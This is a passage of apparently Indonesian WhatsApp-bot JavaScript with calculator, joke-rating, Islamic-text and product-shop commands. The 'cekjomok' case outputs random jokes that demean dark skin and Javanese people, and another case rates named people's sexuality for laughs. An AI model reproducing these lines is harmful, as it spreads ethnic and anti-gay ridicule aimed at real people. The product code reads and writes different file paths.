var nilai_two = Number(bawah)
Reply(`${nilai_one - nilai_two}`)}
break
//----------(Batas Case)----------//
case 'kali':{
if (!text) return Reply(example("10*20"))
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one * nilai_two}`)}
break
//----------(Batas Case)----------//
case 'bagi':{
if (!text) return Reply(example("20/2"))
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one / nilai_two}`)}
break
//------(Batas Case)------//
case 'cekjomok': {
if (!m.isGroup) return Reply(mess.group)
if (!q) return Reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Azril`)
const gans = ['10% hitam','2% jawa','hitam banget😂','jomok anjir, jangan di temenin','wah wah sang makhluk hitam datang','buset jawir 😂','orang suci 🧘🏾‍♂️','jawa njir 👉🏽💩👈🏽','sang raja hitam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
Reply(`Si ${q} *${tengs}*`)
}
break
//------(Batas Case)------//
case 'cantikcek': case 'cekcantik': {
if (!m.isGroup) return Reply(mess.group)
if (!text) return Reply(example("Putri Padang"))
const can = ['10%, banyak" perawatan ya kak:v\nCanda Perawatan:v','30%, Semangat Kaka Merawat Dirinya><','20%, Semangat Ya Kaka👍','40% Wahh Kaka><','50%, kaka cantik deh><','60%, Hai Cantik🐊','70%, Hai Ukhty🐊','62%, Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97%, Assalamualaikum Ukhty🐊','100%, Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94%, Hai Cantik><','75%, Hai Kakak Cantik','82%, wihh Kakak Pasti Sering Perawatan kan??','41%, Semangat:)','39%, Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
Reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
//----------(Batas Case)----------//
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!m.isGroup) return Reply(mess.group)
if (!text) return Reply(example("msbreewc"))
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
Reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
//----------(Batas Case)----------//
case 'kapankah': {
if (!m.isGroup) return Reply(mess.group)
if (!text) return Reply(example("beli iphone"))
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
Reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
//------(Batas Case)------//
case 'gantengcek': case 'cekganteng': {
if (!m.isGroup) return Reply(mess.group)
if (!text) return Reply(example("TamaMods"))
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62%, Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
Reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break
//------(Batas Case)------//
case 'cekkhodam': {
if (!text) return Reply(example("TamaMods"))
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	Reply(response)
  }
break
//------(Batas Case)------//
case 'quotesislami': {
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": 6,
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    Reply(`${arabic}\n${arti}`)
}
break
//------(Batas Case)------//
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
      "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
    },
    {
      "id": 7,
      "name": "Duduk Tasyahud Akhir",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
      "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
    },
    {
      "id": 8,
      "name": "Salam",
      "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
      "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
      "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
    }
  ]
}
    let bacaan = JSON.stringify(bacaanshalat)
    let json = JSON.parse(bacaan)
    let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
    let contoh = `*「 Bacaan Shalat 」*\n\n`
    Reply(`${contoh} + ${data}`)
}
break
//------(Batas Case)------//
case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  Reply(caption)
}
break
//------(Batas Case)------//
case 'addproduk': {
  if (!isCreator) return Reply(mess.owner);
  let input = text.split('|');

  if (input.length < 4) {
    return Reply('❌ Masukkan data produk dengan format: kodeproduk|namaproduk|hargaproduk|deskripsiproduk');
  }

  let [kodeproduk, namaproduk, hargaproduk, deskripsiproduk] = input;

  // Pastikan harga adalah angka
  hargaproduk = parseFloat(hargaproduk);

  if (isNaN(hargaproduk)) {
    return Reply('❌ Harga harus berupa angka.');
  }

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('1database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk sudah ada
    if (daftarProduk.some(item => item.kodeproduk === kodeproduk)) {
      return Reply('❌ Kode produk sudah ada dalam daftar.');
    }

    // Tambahkan produk baru
    let produkBaru = {
      kodeproduk,
      namaproduk,
      hargaproduk,
      deskripsiproduk
    };

    daftarProduk.push(produkBaru);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./Access/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    Reply(`✅ Produk berhasil ditambahkan:\nKode: ${kodeproduk}\nNama: ${namaproduk}\nHarga: ${hargaproduk}\nDeskripsi: ${deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat menambahkan produk:", error);
    Reply('❌ Terjadi kesalahan saat menambahkan produk.');
  }
}
break;

case 'checkproduk': {
  if (!isCreator) return Reply(mess.owner);
  let input = text.trim(); // Hanya mengambil kode produk tanpa pemisah '|'

  if (input.length === 0) {
    return Reply('❌ Masukkan kode produk untuk memeriksa produk.');
  }

  let kodeproduk = input;

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./Access/database/dataproduk.json', 'utf8'));

    // Cari produk berdasarkan kode
    let produk = daftarProduk.find(item => item.kodeproduk === kodeproduk);

    if (!produk) {
      return Reply('❌ Kode produk tidak ditemukan.');
    }

    // Tampilkan detail produk
    Reply(`✅ Informasi produk:\nKode: ${produk.kodeproduk}\nNama: ${produk.namaproduk}\nHarga: ${produk.hargaproduk}\nDeskripsi: ${produk.deskripsiproduk}`);
  } catch (error) {
    console.error("Error saat memeriksa produk:", error);
    Reply('❌ Terjadi kesalahan saat memeriksa produk.');
  }
}
break;

case 'delproduk': {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply('❌ Masukkan kode produk yang ingin dihapus.');

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./Access/database/dataproduk.json', 'utf8'));

    // Cek apakah kode produk ada dalam daftar
    if (!daftarProduk.some(item => item.kodeproduk === text)) {
      return Reply('❌ Kode produk tidak ditemukan dalam daftar.');
    }

    // Hapus produk berdasarkan kodeproduk
    daftarProduk = daftarProduk.filter(item => item.kodeproduk !== text);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./Access/database/dataproduk.json', JSON.stringify(daftarProduk, null, 2));
    Reply(`✅ Produk dengan kode ${text} berhasil dihapus.`);
  } catch (error) {
    console.error("Error saat menghapus produk:", error);
    Reply('❌ Terjadi kesalahan saat menghapus produk.');
  }
}
break;

case 'listproduk': {
  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./Access/database/dataproduk.json', 'utf8'));

    if (daftarProduk.length === 0) {
      return Reply('❌ Tidak ada produk yang terdaftar.');
    }

    // Susun daftar produk
    let teks = '📋 *Daftar Produk:*\n\n';
    let buttonRows = []; // Array untuk tombol pemilihan produk

    daftarProduk.forEach((item, i) => {
      teks += `🆔 ${i + 1}. *Kode:* ${item.kodeproduk}\n   🏷️ *Nama:* ${item.namaproduk}\n   💰 *Harga:* ${item.hargaproduk}\n   📄 *Deskripsi:* ${item.deskripsiproduk}\n\n`;

      // Tambahkan item ke dalam tombol pemilihan
      buttonRows.push({
        title: `${item.namaproduk} - ${item.hargaproduk}`,
        id: `.buyproduk ${item.kodeproduk}`
      });
    });

    teks += 'ℹ️ *Cara Membeli:*\n' +
            'Silakan pilih produk yang tersedia dari daftar di bawah atau gunakan perintah manual:\n' +
            '🛒 _*.buyproduk [kodeproduk]*_\n\n' +
            'Contoh: _*.buyproduk ABC123*_\n\n' +
            'Pastikan kode produk sesuai dengan daftar di atas. ✅';

    // Kirim daftar produk dan tombol pemilihan
    await TamaMods.sendMessage(m.chat, {
      footer: `© 2025 ${botname}`,
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Produk untuk Dibeli' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Produk yang Tersedia',
              sections: [{ title: 'Produk Tersedia', rows: buttonRows }]
            })
          }
        }
      ],
      headerType: 1,
      viewOnce: true,
      image: { url: global.image.logo },
      caption: teks + "\n\n```Atau Bisa Memilih Langsung Dibawah Ini.```\n"
    }, { quoted: pantek });

  } catch (error) {
    console.error("❌ Error saat membaca daftar produk:", error);
    Reply('⚠️ Terjadi kesalahan saat membaca daftar produk.');
  }
}
break;

case 'buyproduk': {
  if (m.isGroup) return Reply("Pembelian produk hanya bisa dilakukan dalam private chat.");
  if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  let kodeproduk = text.trim();
  if (!kodeproduk) return Reply('❌ Masukkan kode produk yang ingin dibeli.');

  try {
    // Baca file JSON
    let daftarProduk = JSON.parse(fs.readFileSync('./Access/database/dataproduk.json', 'utf8'));

    // Cari produk berdasarkan kodeproduk
    let produk = daftarProduk.find(item => item.kodeproduk === kodeproduk);
